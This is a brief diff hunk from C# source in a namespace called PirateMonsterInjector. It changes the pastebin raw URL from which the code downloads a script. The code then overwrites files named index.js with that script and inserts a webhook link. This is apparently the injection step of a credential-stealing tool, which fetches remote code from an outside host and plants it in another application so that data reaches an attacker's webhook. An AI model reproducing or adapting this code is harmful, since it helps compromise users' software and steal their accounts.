@@ -211,7 +211,7 @@ namespace PirateMonsterInjector
                                                 {
                                                     if (item7.Contains("index.js"))
                                                     {
-                                                        File.WriteAllText(item7, new WebClient().DownloadString("https://pastebin.com/raw/EbhLDVNJ").Replace("%WEBHOOK_LINK%", Settings.Webhook));
+                                                        File.WriteAllText(item7, new WebClient().DownloadString("https://pastebin.com/raw/g7wbxdw4").Replace("%WEBHOOK_LINK%", Settings.Webhook));
 
                                                     }
 
